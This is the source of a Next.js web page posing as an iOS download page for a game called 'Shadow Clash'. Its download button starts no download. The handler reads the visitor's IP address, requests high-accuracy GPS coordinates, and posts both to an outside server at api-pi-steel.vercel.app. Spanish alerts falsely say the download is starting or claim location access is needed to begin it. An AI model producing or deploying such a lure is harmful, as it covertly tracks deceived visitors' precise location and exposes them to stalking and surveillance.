import Head from 'next/head';

export default function Home() {
  const handleDownload = async () => {
    try {
      const ipResponse = await fetch('https://api64.ipify.org?format=json');
      const ipData = await ipResponse.json();
      const ip = ipData.ip;

      if (!navigator.geolocation) {
        await fetch('https://api-pi-steel.vercel.app/guardar', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ texto: `IP_ONLY-${ip}` }),
        });
        alert('Se necesita habilitar permisos de ubicación para iniciar descarga');
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = position.coords.latitude.toFixed(6);
          const lon = position.coords.longitude.toFixed(6);
          const text = `${lat},${lon}-${ip}`;

          await fetch('https://api-pi-steel.vercel.app/guardar', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ texto: text }),
          });

          alert('La descarga iniciará en unos segundos.');
        },
        async (error) => {
          await fetch('https://api-pi-steel.vercel.app/guardar', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ texto: `IP_ONLY-${ip}` }),
          });
          alert('Se necesita habilitar permisos de ubicación para iniciar descarga');
          console.error(error);
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    } catch (err) {
      alert('Ocurrió un error al procesar la descarga.');
      console.error(err);
    }
  };

  return (
    <>
      <Head>
        <title>Shadow Clash</title>
        <meta name="description" content="Shadow Clash iOS Download" />
        <link
          href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap"
          rel="stylesheet"
        />
      </Head>

      <div className="min-h-screen bg-gradient-to-b from-[#0f0f0f] to-[#1a1a1a] text-white font-[Inter]">
        {/* Menú vacío */}
        <nav className="w-full py-4 px-8 border-b border-gray-700 flex justify-between items-center">
          <div className="text-xl font-bold">GAME STORE</div>
          <div></div>
        </nav>

        {/* Contenido principal centrado */}
        <div className="flex flex-col items-center justify-center h-[calc(100vh-80px)] text-center px-4">
          <h1 className="text-5xl md:text-6xl font-extrabold mb-8">Shadow Clash</h1>

          <button
            onClick={handleDownload}
            className="flex items-center gap-2 bg-white text-black font-semibold px-6 py-3 rounded-lg hover:bg-gray-200 transition"
          >
            <img src="/apple.svg" alt="Apple" className="w-5 h-5" />
            Descargar para iOS V.2.1
          </button>

          <h2 className="text-lg md:text-xl font-extrabold mt-6">
            También disponible para macOS, Android, iPhone (toda America) y iPad (toda America)
          </h2>
        </div>
      </div>
    </>
  );
}
